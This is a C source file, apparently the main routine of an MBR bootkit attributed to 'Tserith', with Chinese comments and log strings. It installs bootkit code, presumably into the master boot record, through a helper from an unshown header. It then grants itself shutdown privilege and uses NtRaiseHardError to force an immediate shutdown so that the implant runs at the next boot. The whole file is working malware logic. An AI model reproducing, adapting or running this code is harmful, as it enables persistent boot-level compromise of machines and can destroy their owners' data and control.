#include "bootkit.h"

void main()
{
    STATUS_INIT;
    ULONG response;
    BOOLEAN wasEnabled;

    // 打印程序启动日志
    LOG("[寄生虫] MBR Bootkit - 作者: Tserith\n\n");

    // 安装 Bootkit
    status = Install(BootkitStart, (UINT16)((PINT8)BootkitEnd - (PINT8)BootkitStart));
    if (!NT_SUCCESS(status))
    {
        LOG("[-] 安装 Bootkit 失败，状态码: %x\n", status);
        goto fail;
    }
    
    LOG("[*] Bootkit 安装成功，正在进行强制关机...\n");

    // 调整权限以允许关机
    status = RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &wasEnabled);
    if (!NT_SUCCESS(status))
    {
        LOG("[-] 调整权限失败，状态码: %x\n", status);
        goto fail;
    }
    LOG("[*] 权限调整成功。\n");

    // 等待 2.5 秒
    Sleep(2500);

    // 强制关机
    status = NtRaiseHardError(STATUS_NOT_IMPLEMENTED, 0, 0, NULL, OptionShutdownSystem, &response);
    if (!NT_SUCCESS(status))
    {
        LOG("[-] 触发硬错误失败，状态码: %x\n", status);
        goto fail;
    }
    LOG("[*] 强制关机成功。\n");

fail:
    if (!NT_SUCCESS(status))
    {
        if (STATUS_SPACES_EXTENDED_ERROR == status)
        {
            status = GetLastError();
        }
        LOG("[-] 错误: %x\n", status);

        // 额外日志打印，显示详细错误信息
        LOG("[-] 详细错误信息: %u\n", status);
        Sleep(4000);
    }
}
